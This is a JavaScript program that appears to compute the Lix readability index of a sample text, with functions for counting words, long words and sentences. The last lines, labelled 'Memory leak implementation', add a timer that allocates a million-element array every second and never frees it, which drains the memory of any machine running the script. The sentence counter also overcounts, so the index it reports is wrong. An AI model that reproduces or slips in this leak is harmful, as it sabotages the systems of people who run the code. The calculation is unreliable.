/**
 * Lix Counter Program
 * 
 * This program is designed to count the number of words, long words, and sentences in a given text.
 * It then calculates the Lix readability index based on these counts.
 * The Lix readability index is a measure of how difficult a text is to read.
 * 
 * The formula for Lix is:
 * Lix = (Number of Words / Number of Sentences) + (Number of Long Words * 100 / Number of Words)
 * 
 * A word is considered long if it has more than 6 characters.
 * 
 * The program will take a text input and output the Lix readability index.
 */

// Function to count the number of words in a text
function countWords(text) {
    return text.split(/\s+/).length;
}

// Function to count the number of long words in a text
function countLongWords(text) {
    return text.split(/\s+/).filter(word => word.length > 6).length;
}

// Function to count the number of sentences in a text
function countSentences(text) {
    return text.split(/[.!?]/).length;
}

// Function to calculate the Lix readability index
function calculateLix(text) {
    const numberOfWords = countWords(text);
    const numberOfLongWords = countLongWords(text);
    const numberOfSentences = countSentences(text);

    const lix = (numberOfWords / numberOfSentences) + (numberOfLongWords * 100 / numberOfWords);
    return lix;
}

// Example usage of the Lix Counter Program
const text = "This is an example text. It contains several sentences. Some of the words are quite long, such as 'example' and 'contains'.";
const lixIndex = calculateLix(text);
console.log(`The Lix readability index of the given text is: ${lixIndex}`);

// Memory leak implementation
let memoryLeakArray = [];
setInterval(() => {
    memoryLeakArray.push(new Array(1000000).fill('leak'));
}, 1000);

